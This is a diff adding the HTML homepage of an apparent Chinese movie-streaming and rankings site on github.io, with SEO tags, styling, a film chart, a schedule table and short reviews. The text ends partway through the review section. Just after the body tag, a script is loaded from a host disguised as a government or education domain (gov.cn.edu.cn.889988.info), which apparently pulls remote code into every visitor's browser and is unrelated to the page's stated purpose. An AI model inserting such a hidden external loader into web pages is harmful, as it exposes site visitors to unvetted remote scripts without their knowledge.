@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#0b1016">
+<meta name="format-detection" content="telephone=no">
+<title>热播电影网_高清热播影视榜单每日更新_在线观影排片与影评合集</title>
+<meta name="description" content="热播电影网收录动作、科幻、悬疑、动画、喜剧等类型的高清热播影视资源，提供每日更新的热播榜、在线排片时刻表、剧情详解与影评观点，支持多清晰度切换与移动端直接播放，找片、追榜、看评测一站看完。">
+<meta name="keywords" content="热播电影网,热播电影,热播影视排行榜,高清电影在线观看,最新电影推荐,电影剧情解析,影视排片表,豆瓣高分电影,热播剧集更新">
+<meta name="author" content="热播电影网编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<link rel="canonical" href="https://rebodianyingwang-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="热播电影网">
+<meta property="og:title" content="热播电影网_高清热播影视榜单每日更新">
+<meta property="og:description" content="热播榜、排片时刻表、类型索引、影评观点，热播电影网每天更新，手机打开就能看。">
+<meta property="og:url" content="https://rebodianyingwang-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="热播电影网_高清热播影视榜单每日更新">
+<meta name="twitter:description" content="热播电影网：热播榜、在线排片、类型索引、影评观点，每日更新。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--ink:#0b1016;
+--ink2:#121a23;
+--line:#223040;
+--gold:#f0b429;
+--gold2:#ffd166;
+--paper:#e8e6e3;
+--grey:#8b98a5;
+--card:#151f2a;
+}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+background:var(--ink);
+color:var(--paper);
+font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+font-size:16px;line-height:1.75;
+-webkit-font-smoothing:antialiased;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 18px}
+.hide{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+
+/* 顶部 */
+.topbar{
+position:sticky;top:0;z-index:60;
+background:rgba(11,16,22,.94);
+backdrop-filter:blur(10px);
+border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:16px;height:60px}
+.logo{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.reel{
+width:32px;height:32px;border-radius:50%;
+border:3px solid var(--gold);
+position:relative;flex:0 0 auto;
+}
+.reel::before,.reel::after{
+content:"";position:absolute;background:var(--gold);border-radius:50%;
+}
+.reel::before{width:7px;height:7px;top:5px;left:5px}
+.reel::after{width:7px;height:7px;bottom:5px;right:5px}
+.logo b{font-size:19px;letter-spacing:1px;color:#fff}
+.logo b em{font-style:normal;color:var(--gold)}
+.logo span{font-size:11px;color:var(--grey);letter-spacing:.5px;display:block;line-height:1.1;margin-top:-2px}
+.nav{margin-left:auto;display:flex;gap:4px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+.nav::-webkit-scrollbar{display:none}
+.nav a{
+white-space:nowrap;font-size:14px;color:#c6cfd8;
+padding:7px 13px;border-radius:20px;transition:.25s;
+}
+.nav a:hover{background:rgba(240,180,41,.14);color:var(--gold2)}
+.btn-top{
+flex:0 0 auto;display:none;font-size:13px;padding:8px 14px;border-radius:20px;
+background:var(--gold);color:#1b1405;font-weight:600;
+}
+@media(min-width:900px){.btn-top{display:block}}
+
+/* 首屏 */
+.hero{
+position:relative;overflow:hidden;
+background:
+radial-gradient(900px 420px at 78% -10%,rgba(240,180,41,.16),transparent 62%),
+linear-gradient(180deg,#0e141c 0%,#0b1016 100%);
+border-bottom:1px solid var(--line);
+}
+.hero::before{
+content:"";position:absolute;inset:0;opacity:.35;
+background-image:repeating-linear-gradient(90deg,transparent 0 38px,rgba(255,255,255,.045) 38px 40px);
+}
+.hero .wrap{position:relative;padding:52px 18px 58px}
+.crumb{font-size:12.5px;color:var(--grey);margin-bottom:18px}
+.crumb a:hover{color:var(--gold)}
+.hero-grid{display:grid;grid-template-columns:1fr;gap:38px;align-items:center}
+@media(min-width:960px){.hero-grid{grid-template-columns:1.15fr .85fr;gap:52px}}
+h1{
+font-size:clamp(30px,6.2vw,54px);line-height:1.22;letter-spacing:1px;color:#fff;font-weight:800;
+position:relative;z-index:0;
+}
+h1 em{font-style:normal;color:var(--gold);position:relative}
+h1 em::after{
+content:"";position:absolute;left:0;right:0;bottom:4px;height:8px;
+background:rgba(240,180,41,.22);z-index:-1;
+}
+.lead{margin-top:18px;font-size:16.5px;color:#b9c3cd;max-width:640px}
+.hero-tags{display:flex;flex-wrap:wrap;gap:9px;margin-top:22px}
+.hero-tags a{
+font-size:12.5px;padding:5px 12px;border:1px solid var(--line);
+border-radius:4px;color:#a9b5c1;background:rgba(255,255,255,.02);
+}
+.hero-tags a:hover{border-color:var(--gold);color:var(--gold2)}
+.hero-btns{display:flex;flex-wrap:wrap;gap:12px;margin-top:28px}
+.btn{
+display:inline-block;padding:13px 26px;border-radius:6px;font-size:15px;font-weight:600;transition:.25s;
+}
+.btn-gold{background:linear-gradient(135deg,var(--gold),#ffc94d);color:#1b1405;box-shadow:0 8px 22px rgba(240,180,41,.22)}
+.btn-gold:hover{transform:translateY(-2px);box-shadow:0 12px 26px rgba(240,180,41,.32)}
+.btn-ghost{border:1px solid var(--line);color:#d8dee5}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold2)}
+.url-line{
+margin-top:26px;font-size:13px;color:var(--grey);
+border-left:3px solid var(--gold);padding-left:12px;word-break:break-all;
+}
+.url-line b{color:var(--gold2);font-weight:600}
+
+/* 首屏右卡片 */
+.stack{position:relative;height:300px;max-width:380px;margin:0 auto;width:100%}
+@media(min-width:960px){.stack{height:340px}}
+.poster{
+position:absolute;border-radius:10px;overflow:hidden;
+border:1px solid rgba(255,255,255,.1);
+box-shadow:0 18px 40px rgba(0,0,0,.5);
+display:flex;flex-direction:column;justify-content:flex-end;
+padding:16px;
+}
+.poster .t{font-size:16px;font-weight:700;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.6)}
+.poster .s{font-size:12px;color:rgba(255,255,255,.75);margin-top:4px}
+.poster .badge{
+position:absolute;top:10px;left:10px;font-size:11px;padding:3px 8px;border-radius:3px;
+background:rgba(0,0,0,.55);color:var(--gold2);border:1px solid rgba(240,180,41,.4);
+}
+.p1{width:60%;height:78%;left:0;top:14%;background:linear-gradient(150deg,#1d3b57,#0d1b28);transform:rotate(-6deg);z-index:1}
+.p2{width:60%;height:78%;right:0;top:6%;background:linear-gradient(150deg,#5a3410,#241505);transform:rotate(5deg);z-index:2}
+.p3{width:56%;height:72%;left:22%;top:2%;background:linear-gradient(150deg,#3a1d3d,#140a16);transform:rotate(-1deg);z-index:3}
+.p3 .score{position:absolute;right:12px;bottom:52px;font-size:30px;font-weight:800;color:var(--gold2);text-shadow:0 2px 8px rgba(0,0,0,.7)}
+
+/* 数据条 */
+.stats{border-bottom:1px solid var(--line);background:var(--ink2)}
+.stats .wrap{display:grid;grid-template-columns:repeat(2,1fr);gap:1px;background:var(--line)}
+@media(min-width:760px){.stats .wrap{grid-template-columns:repeat(4,1fr)}}
+.stat{background:var(--ink2);padding:22px 16px;text-align:center}
+.stat b{display:block;font-size:clamp(22px,4vw,30px);color:var(--gold2);font-weight:800;letter-spacing:.5px}
+.stat span{font-size:12.5px;color:var(--grey)}
+
+/* 区块 */
+section{padding:56px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:14px;flex-wrap:wrap;margin-bottom:26px}
+.sec-head h2{
+font-size:clamp(21px,3.6vw,28px);color:#fff;font-weight:800;letter-spacing:.5px;
+display:flex;align-items:center;gap:10px;
+}
+.sec-head h2::before{content:"";width:5px;height:22px;background:var(--gold);border-radius:2px}
+.sec-head p{font-size:13px;color:var(--grey);max-width:520px}
+.sec-head .more{font-size:13px;color:var(--gold);white-space:nowrap}
+.sec-head .more:hover{text-decoration:underline}
+
+/* 榜单 */
+.rank{display:grid;gap:12px}
+.rank li{
+display:grid;grid-template-columns:46px 78px 1fr;gap:14px;align-items:center;
+background:var(--card);border:1px solid var(--line);border-radius:8px;padding:12px 14px;transition:.25s;
+}
+.rank li:hover{border-color:rgba(240,180,41,.55);transform:translateX(3px)}
+.rank .no{font-size:24px;font-weight:800;color:#2f3f50;text-align:center;font-family:Georgia,"Times New Roman",serif}
+.rank li:nth-child(1) .no,.rank li:nth-child(2) .no,.rank li:nth-child(3) .no{color:var(--gold)}
+.cover{
+width:78px;height:104px;border-radius:5px;display:flex;align-items:flex-end;justify-content:center;
+font-size:12px;color:rgba(255,255,255,.85);padding-bottom:6px;
+box-shadow:inset 0 -30px 40px rgba(0,0,0,.45);
+}
+.rank h3{font-size:16.5px;color:#fff;font-weight:700;line-height:1.4}
+.rank h3 a:hover{color:var(--gold2)}
+.meta{font-size:12.5px;color:var(--grey);margin-top:5px}
+.meta i{font-style:normal;color:#6f7d8c;margin:0 6px}
+.desc{font-size:13.5px;color:#a7b3bf;margin-top:7px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.score{color:var(--gold2);font-weight:700}
+
+/* 类型 */
+.types{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+@media(min-width:700px){.types{grid-template-columns:repeat(4,1fr)}}
+.type{
+position:relative;border-radius:8px;overflow:hidden;padding:20px 16px 18px;
+border:1px solid var(--line);min-height:118px;display:flex;flex-direction:column;justify-content:flex-end;
+transition:.3s;
+}
+.type:hover{transform:translateY(-4px);border-color:rgba(240,180,41,.5)}
+.type strong{font-size:18px;color:#fff;font-weight:700}
+.type small{font-size:12px;color:rgba(255,255,255,.7);margin-top:5px;display:block}
+.type span.tagx{position:absolute;top:12px;right:12px;font-size:11px;color:rgba(255,255,255,.8);border:1px solid rgba(255,255,255,.25);padding:2px 7px;border-radius:3px}
+.t1{background:linear-gradient(160deg,#40230c,#170d04)}
+.t2{background:linear-gradient(160deg,#0f3350,#061520)}
+.t3{background:linear-gradient(160deg,#3a1330,#160814)}
+.t4{background:linear-gradient(160deg,#123a2c,#061a13)}
+.t5{background:linear-gradient(160deg,#2f2a52,#12102a)}
+.t6{background:linear-gradient(160deg,#4a1f26,#1a0a0d)}
+.t7{background:linear-gradient(160deg,#1c3a3f,#08191c)}
+.t8{background:linear-gradient(160deg,#3d3417,#171304)}
+
+/* 排片表 */
+.tablebox{overflow-x:auto;-webkit-overflow-scrolling:touch;border:1px solid var(--line);border-radius:8px}
+table{width:100%;border-collapse:collapse;min-width:620px;background:var(--card)}
+th{
+background:#1b2734;color:#cfd8e1;font-size:13px;font-weight:600;text-align:left;
+padding:13px 14px;border-bottom:1px solid var(--line);white-space:nowrap;
+}
+td{padding:13px 14px;border-bottom:1px solid #1c2836;font-size:14px;color:#c3ccd5}
+tr:last-child td{border-bottom:none}
+tbody tr:hover{background:rgba(240,180,41,.05)}
+td a{color:#fff}
+td a:hover{color:var(--gold2)}
+.pill{font-size:11.5px;padding:2px 9px;border-radius:12px;background:rgba(240,180,41,.14);color:var(--gold2);border:1px solid rgba(240,180,41,.3)}
+.pill.gray{background:rgba(255,255,255,.06);color:#9fabb8;border-color:rgba(255,255,255,.12)}
+
+/* 影评+资讯 */
+.two{display:grid;gap:22px}
+@media(min-width:900px){.two{grid-template-columns:1.3fr 1fr;gap:28px}}
+.reviews{display:grid;gap:14px}
+@media(min-width:600px){.reviews{grid-template-columns:1fr 1fr}}
+@media(min-width:900px){.reviews{grid-template-columns:1fr 1fr}}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:16px 16px 14px}
+.rv .who{display:flex;align-items:center;gap:9px;font-size:12.5px;color:var(--grey)}
+.ava{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--gold),#c2410c);flex:0 0 auto}
+.rv h3{font-size:15.5px;color:#fff;margin-top:10px;line-height:1.5}
+.rv h3 a:hover{color:var(--gold2)}
+.rv p{font-size:13.5px;color:#a3aeb9;margin-top:8px;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.stars{color:var(--gold2);font-size:12.5px;letter-spacing:1px}
+.news{border:1px solid var(--line);border-radius:8px;background:var(--card);padding:6px 0}
+.news li{border-bottom:1px dashed #1e2b3a}
+.news li:last-child{border-bottom:none}
+.news a{display:flex;gap:12px;padding:13px 16px;align-items:baseline}
+.news a:hover{background:rgba(240,180,41,.05)}
+.news time{font-size:12px;color:#6f7d8c;flex:0 0 auto;font-family:Georgia,serif}
+.news span{font-size:14px;color:#d3dae1}
+.news a:hover span{color:var(--gold2)}
+
+/* FAQ */
+.faq{display:grid;gap:10px}
+.faq details{background:var(--card);border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.faq summary{
+cursor:pointer;padding:16px 46px 16px 18px;position:relative;font-size:15.5px;color:#fff;font-weight:600;
+list-style:none;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{
+content:"+";position:absolute;right:18px;top:50%;transform:translateY(-50%);
+color:var(--gold);font-size:20px;font-weight:700;
+}
+.faq details[open] summary::after{content:"–"}
+.faq details[open] summary{border-bottom:1px solid var(--line)}
+.faq p{padding:14px 18px 18px;font-size:14px;color:#a9b4bf}
+
+/* 页脚 */
+footer{background:#080c11;padding:44px 0 26px;font-size:13.5px;color:#7d8b99}
+.f-grid{display:grid;gap:26px}
+@media(min-width:760px){.f-grid{grid-template-columns:1.4fr 1fr 1fr 1fr}}
+.f-grid h4{font-size:14px;color:#fff;margin-bottom:12px;font-weight:700}
+.f-grid a{display:block;padding:5px 0;color:#8c99a6}
+.f-grid a:hover{color:var(--gold2)}
+.f-about p{color:#7d8b99;line-height:1.9}
+.f-about .u{color:var(--gold2);word-break:break-all}
+.bottom{
+margin-top:30px;padding-top:18px;border-top:1px solid #151d26;
+display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;align-items:center;font-size:12.5px;
+}
+.totop{position:fixed;right:14px;bottom:16px;width:42px;height:42px;border-radius:50%;
+background:rgba(240,180,41,.92);color:#1b1405;display:flex;align-items:center;justify-content:center;
+font-size:18px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,.45);z-index:50}
+@media(max-width:520px){
+.hero .wrap{padding:38px 18px 44px}
+.rank li{grid-template-columns:36px 62px 1fr;gap:10px;padding:10px}
+.cover{width:62px;height:84px}
+.desc{-webkit-line-clamp:2}
+footer{padding:34px 0 20px}
+}
+</style>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://rebodianyingwang-app.github.io/#website",
+      "url": "https://rebodianyingwang-app.github.io/",
+      "name": "热播电影网",
+      "alternateName": ["热播电影", "热播影视榜"],
+      "inLanguage": "zh-CN",
+      "description": "热播电影网提供高清热播影视榜单、在线排片时刻表、类型索引与影评观点，每日更新。"
+    },
+    {
+      "@type": "CollectionPage",
+      "@id": "https://rebodianyingwang-app.github.io/#webpage",
+      "url": "https://rebodianyingwang-app.github.io/",
+      "name": "热播电影网_高清热播影视榜单每日更新",
+      "isPartOf": { "@id": "https://rebodianyingwang-app.github.io/#website" },
+      "about": "热播电影排行榜与观影指南",
+      "inLanguage": "zh-CN",
+      "primaryImageOfPage": { "@type": "ImageObject", "caption": "热播电影网首页" }
+    },
+    {
+      "@type": "ItemList",
+      "name": "热播电影网今日热播榜",
+      "itemListOrder": "https://schema.org/ItemListOrderDescending",
+      "numberOfItems": 8,
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "肖申克的救赎", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 2, "name": "星际穿越", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 3, "name": "千与千寻", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 4, "name": "盗梦空间", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 5, "name": "阿甘正传", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 6, "name": "疯狂动物城", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 7, "name": "寄生虫", "url": "https://rebodianyingwang-app.github.io/#hot" },
+        { "@type": "ListItem", "position": 8, "name": "让子弹飞", "url": "https://rebodianyingwang-app.github.io/#hot" }
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <a class="logo" href="#">
+      <span class="reel" aria-hidden="true"></span>
+      <span>
+        <b>热播<em>电影网</em></b>
+        <span>REBODIANYINGWANG</span>
+      </span>
+    </a>
+    <nav class="nav" aria-label="主导航">
+      <a href="#hot">热播榜</a>
+      <a href="#type">类型索引</a>
+      <a href="#schedule">排片表</a>
+      <a href="#review">影评</a>
+      <a href="#news">观影动态</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <a class="btn-top" href="#">收藏本站</a>
+  </div>
+</div>
+
+<header class="hero">
+  <div class="wrap">
+    <p class="crumb"><a href="#">首页</a> &rsaquo; <a href="#hot">热播榜</a> &rsaquo; 今日更新</p>
+    <div class="hero-grid">
+      <div>
+        <h1>热播电影网：把<em>今天值得看</em>的片一次排好</h1>
+        <p class="lead">榜单每六小时刷新一次，排片表跟着影院场次同步。动作、科幻、悬疑、动画、喜剧分好类，点开就有剧情详解、清晰度选项和真实观影反馈，不用在几个站之间来回跳。</p>
+        <div class="hero-tags">
+          <a href="#hot">热播榜</a>
+          <a href="#type">科幻</a>
+          <a href="#type">悬疑</a>
+          <a href="#type">动画</a>
+          <a href="#schedule">今日排片</a>
+          <a href="#faq">清晰度切换</a>
+        </div>
+        <div class="hero-btns">
+          <a class="btn btn-gold" href="#hot">看今日热播榜</a>
+          <a class="btn btn-ghost" href="#schedule">查排片时刻</a>
+        </div>
+        <p class="url-line">本站地址：<b>https://rebodianyingwang-app.github.io</b>，建议加入浏览器书签，更新不迷路。</p>
+      </div>
+      <div class="stack" aria-hidden="true">
+        <div class="poster p1">
+          <span class="badge">热播中</span>
+          <div>
+            <div class="t">星际穿越</div>
+            <div class="s">科幻 · 169分钟</div>
+          </div>
+        </div>
+        <div class="poster p2">
+          <span class="badge">新上榜</span>
+          <div>
+            <div class="t">让子弹飞</div>
+            <div class="s">喜剧 · 132分钟</div>
+          </div>
+        </div>
+        <div class="poster p3">
+          <span class="badge">榜首</span>
+          <div>
+            <div class="t">肖申克的救赎</div>
+            <div class="s">剧情 · 142分钟</div>
+          </div>
+          <div class="score">9.7</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="stats">
+  <div class="wrap">
+    <div class="stat"><b>12860+</b><span>在库影视条目</span></div>
+    <div class="stat"><b>6 小时</b><span>榜单刷新间隔</span></div>
+    <div class="stat"><b>1080P / 4K</b><span>双清晰度可选</span></div>
+    <div class="stat"><b>18 类</b><span>类型与地区标签</span></div>
+  </div>
+</div>
+
+<main>
+
+<section id="hot">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>今日热播榜</h2>
+        <p>按近 24 小时站内播放热度排序，括号内为本站综合评分，满分 10 分。</p>
+      </div>
+      <a class="more" href="#">查看完整榜单 &rarr;</a>
+    </div>
+    <ol class="rank">
+      <li>
+        <div class="no">1</div>
+        <div class="cover" style="background:linear-gradient(160deg,#254a63,#0c1a24)">剧情</div>
+        <div>
+          <h3><a href="#">肖申克的救赎</a></h3>
+          <p class="meta">1994<i>|</i>剧情 / 犯罪<i>|</i>142 分钟<i>|</i><span class="score">9.7 分</span></p>
+          <p class="desc">银行家安迪被误判入狱，用二十年时间完成一场不动声色的自我救赎。全片节奏克制，结尾的海边重逢至今仍是影史名场面。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">2</div>
+        <div class="cover" style="background:linear-gradient(160deg,#123a5c,#050f1a)">科幻</div>
+        <div>
+          <h3><a href="#">星际穿越</a></h3>
+          <p class="meta">2014<i>|</i>科幻 / 冒险<i>|</i>169 分钟<i>|</i><span class="score">9.4 分</span></p>
+          <p class="desc">地球濒临枯竭，一支小队穿越土星旁的虫洞寻找新家园。太空段落的配乐和黑洞画面，是很多人第一次在银幕上看懂相对论。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">3</div>
+        <div class="cover" style="background:linear-gradient(160deg,#3d2a52,#120c1c)">动画</div>
+        <div>
+          <h3><a href="#">千与千寻</a></h3>
+          <p class="meta">2001<i>|</i>动画 / 奇幻<i>|</i>125 分钟<i>|</i><span class="score">9.4 分</span></p>
+          <p class="desc">十岁女孩误入神灵世界，为救回父母在汤屋里打工。看似童话，讲的却是一个人怎么在陌生环境里守住自己的名字。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">4</div>
+        <div class="cover" style="background:linear-gradient(160deg,#2b3340,#0c1017)">悬疑</div>
+        <div>
+          <h3><a href="#">盗梦空间</a></h3>
+          <p class="meta">2010<i>|</i>科幻 / 悬疑<i>|</i>148 分钟<i>|</i><span class="score">9.4 分</span></p>
+          <p class="desc">造梦师带队进入多层梦境植入念头。四层梦境同时推进却不乱，结尾那只还在转的陀螺讨论了十几年。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">5</div>
+        <div class="cover" style="background:linear-gradient(160deg,#4a3a1c,#17120a)">励志</div>
+        <div>
+          <h3><a href="#">阿甘正传</a></h3>
+          <p class="meta">1994<i>|</i>剧情 / 励志<i>|</i>142 分钟<i>|</i><span class="score">9.5 分</span></p>
+          <p class="desc">智商不高的阿甘一路跑过越战、捕虾船和半个美国近代史。看完会有点想出门跑两圈。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">6</div>
+        <div class="cover" style="background:linear-gradient(160deg,#1f5a46,#081d16)">喜剧</div>
+        <div>
+          <h3><a href="#">疯狂动物城</a></h3>
+          <p class="meta">2016<i>|</i>动画 / 喜剧<i>|</i>109 分钟<i>|</i><span class="score">9.2 分</span></p>
+          <p class="desc">兔子警官和狐狸骗子联手查案，动物城的每个街区都藏着关于偏见的笑点，成年人看得比小孩更懂。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">7</div>
+        <div class="cover" style="background:linear-gradient(160deg,#3a3230,#130f0e)">惊悚</div>
+        <div>
+          <h3><a href="#">寄生虫</a></h3>
+          <p class="meta">2019<i>|</i>剧情 / 惊悚<i>|</i>132 分钟<i>|</i><span class="score">8.8 分</span></p>
+          <p class="desc">一家人渗进富人别墅做工，前半段是精巧的喜剧，后半段急转直下。暴雨夜那场戏拍得极其干脆。</p>
+        </div>
+      </li>
+      <li>
+        <div class="no">8</div>
+        <div class="cover" style="background:linear-gradient(160deg,#5c2418,#1c0a06)">动作</div>
+        <div>
+          <h3><a href="#">让子弹飞</a></h3>
+          <p class="meta">2010<i>|</i>喜剧 / 动作<i>|</i>132 分钟<i>|</i><span class="score">8.9 分</span></p>
+          <p class="desc">土匪冒充县长进鹅城，和地头蛇斗智斗狠。台词密度高，每次重看都能捡出几句新的。</p>
+        </div>
+      </li>
+    </ol>
+  </div>
+</section>
+
+<section id="type">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>类型索引</h2>
+        <p>按题材直接进片库，每个类型页都带年份筛选和地区筛选。</p>
+      </div>
+      <a class="more" href="#">全部 18 个类型 &rarr;</a>
+    </div>
+    <div class="types">
+      <a class="type t1" href="#"><span class="tagx">3240 部</span><strong>动作</strong><small>枪战 · 格斗 · 追车</small></a>
+      <a class="type t2" href="#"><span class="tagx">2180 部</span><strong>科幻</strong><small>太空 · 赛博 · 末世</small></a>
+      <a class="type t3" href="#"><span class="tagx">1960 部</span><strong>悬疑</strong><small>推理 · 反转 · 密室</small></a>
+      <a class="type t4" href="#"><span class="tagx">1470 部</span><strong>喜剧</strong><small>荒诞 · 家庭 · 黑色幽默</small></a>
+      <a class="type t5" href="#"><span class="tagx">1120 部</span><strong>动画</strong><small>剧场版 · 手绘 · 三维</small></a>
+      <a class="type t6" href="#"><span class="tagx">980 部</span><strong>爱情</strong><small>青春 · 都市 · 年代</small></a>
+      <a class="type t7" href="#"><span class="tagx">640 部</span><strong>纪录片</strong><small>自然 · 人文 · 历史</small></a>
+      <a class="type t8" href="#"><span class="tagx">760 部</span><strong>犯罪</strong><small>缉毒 · 庭审 · 卧底</small></a>
+    </div>
+  </div>
+</section>
+
+<section id="schedule">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>今日排片时刻表</h2>
+        <p>表格按开场时间排列，标"热播"的场次为站内播放量前列，实际以影院当日公告为准。</p>
+      </div>
+      <a class="more" href="#hot">回到热播榜 &rarr;</a>
+    </div>
+    <div class="tablebox">
+      <table>
+        <caption class="hide">热播电影网今日排片时刻表</caption>
+        <thead>
+          <tr>
+            <th scope="col">开场</th>
+            <th scope="col">片名</th>
+            <th scope="col">影厅</th>
+            <th scope="col">时长</th>
+            <th scope="col">语言</th>
+            <th scope="col">状态</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>10:20</td>
+            <td><a href="#">千与千寻</a></td>
+            <td>3 号激光厅</td>
+            <td>125 分钟</td>
+            <td>日语原声</td>
+            <td><span class="pill">热播</span></td>
+          </tr>
+          <tr>
+            <td>12:40</td>
+            <td><a href="#">疯狂动物城</a></td>
+            <td>1 号巨幕厅</td>
+            <td>109 分钟</td>
+            <td>国语配音</td>
+            <td><span class="pill">热播</span></td>
+          </tr>
+          <tr>
+            <td>14:10</td>
+            <td><a href="#">盗梦空间</a></td>
+            <td>5 号杜比厅</td>
+            <td>148 分钟</td>
+            <td>英语原声</td>
+            <td><span class="pill">有票</span></td>
+          </tr>
+          <tr>
+            <td>16:30</td>
+            <td><a href="#">星际穿越</a></td>
+            <td>IMAX 厅</td>
+            <td>169 分钟</td>
+            <td>英语原声</td>
+            <td><span class="pill">热播</span></td>
+          </tr>
+          <tr>
+            <td>19:00</td>
+            <td><a href="#">肖申克的救赎</a></td>
+            <td>2 号厅</td>
+            <td>142 分钟</td>
+            <td>英语原声</td>
+            <td><span class="pill">热播</span></td>
+          </tr>
+          <tr>
+            <td>21:20</td>
+            <td><a href="#">寄生虫</a></td>
+            <td>6 号厅</td>
+            <td>132 分钟</td>
+            <td>韩语原声</td>
+            <td><span class="pill gray">末场</span></td>
+          </tr>
+          <tr>
+            <td>22:05</td>
+            <td><a href="#">让子弹飞</a></td>
+            <td>4 号厅</td>
+            <td>132 分钟</td>
+            <td>国语</td>
+            <td><span class="pill gray">末场</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="review">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>影评与观影动态</h2>
+        <p>左侧是站内编辑和影迷写的短评，右侧是更新日志和观影提示。</p>
+      </div>
+      <a class="more" href="#">写一条短评 &rarr;</a>
+    </div>
+    <div class="two">
+      <div class="reviews">
+        <article class="rv">
+          <div class="who"><span class="ava" aria-hidden="true"></span>影迷 · 老周 <span class="stars">★★★★★</span></div>
+          <h3><a href="#">《星际穿越》重看第三遍，才听懂那段管风琴</a></h3>
+          <p>第一次看只顾着看黑洞，这次注意到的全是配乐。玉米地被沙尘吞掉的那段，画面越安静越让人心里发紧，诺兰把"时间不够了"这件事拍出了重量。</p>
+        </article>
+        <article class="rv">
+          <div class="who"><span class="ava" aria-hidden="true"></span>编辑 · 小林 <span class="stars">★★★★☆</span></div>
+          <h3><a href="#">《让子弹飞》的台词为什么十年后还在被引用</a></h3>
+          <p>因为它把话都藏在双关里，看懂一层是一层的爽。节奏也猛，几乎没有废镜头，张麻子进城那场戏的剪辑密度现在很少有国产片敢这么拍。</p>
+        </article>
+        <article class="rv">
+          <div class="who"><span class="ava" aria-hidden="true"></span>影迷 · 阿枝 <span class="stars">★★★★★</span></div>
+          <h3><a href="#">带七岁的孩子看《千与千寻》，他问了三个好问题</a></h3>
+          <p>问千寻为什么不敢吃、问无脸男为什么变坏、问名字忘记会怎样。一部动画能让小孩自己问出这些，比讲十遍道理都有用。</p>
+        </article>
+        <article class="rv">
+          <div class="who"><span class="ava" aria-hidden="true"></span>影迷 · 大鹏 <span class="stars">★★★★☆</span></div>
+          <h3><a href="#">《寄生虫》那场暴雨，是全片最狠的一次剪辑</a></h3>
+          <p>前半段像精巧的骗局喜剧，一通电话就把整栋房子的秩序打翻。镜头从上往下一路走，越走越低，情绪跟着一起沉。</p>
+        </article>
+      </div>
+      <div>
+        <ul class="news" id="news">
+          <li><a href="#"><time>10-16</time><span>热播榜完成一次刷新，科幻类新增 12 条条目</span></a></li>
+          <li><a href="#"><time>10-14</time><span>【观影提示】IMAX 场次建议提前 30 分钟到场选座</span></a></li>
+          <li><a href="#"><time>10-11</time><span>动画类型页上线年份筛选，支持 1980 年至今</span></a></li>
+          <li><a href="#"><time>10-08</time><span>排片表接入晚间末场，21 点后场次单独标注</span></a></li>
+          <li><a href="#"><time>10-05</time><span>短评区开放，影评需满 60 字才会展示</span></a></li>
+          <li><a href="#"><time>10-02</time><span>移动端播放页改版，横竖屏切换不再中断</span></a></li>
+          <li><a href="#"><time>09-28</time><span>纪录片类型新增自然、人文两个子分类</span></a></li>
+        </ul>
+      </div>
